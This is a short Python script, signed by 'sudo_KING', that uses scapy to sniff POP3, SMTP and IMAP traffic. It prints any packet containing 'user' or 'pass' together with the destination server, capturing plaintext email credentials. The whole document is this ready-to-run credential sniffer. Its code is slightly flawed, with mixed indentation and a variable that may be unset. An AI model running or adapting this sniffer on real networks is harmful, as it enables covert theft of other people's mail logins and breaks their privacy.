######Simple python mail sniffer######
#####Brought to you by .0. sudo_KING#####

#!/usr/bin/python2.7

from scapy.all import *

#our packet callback
def packet_callback(packet):

 if packet[TCP].payload:

  mail_packet = str(packet[TCP].payload)

 if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

	print "[*] Server: %s" % packet[IP].dst
	print "[*] %s" % packet[TCP].payload

#fire up the sniffererererrerererrrrrzzzzzz
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0) 
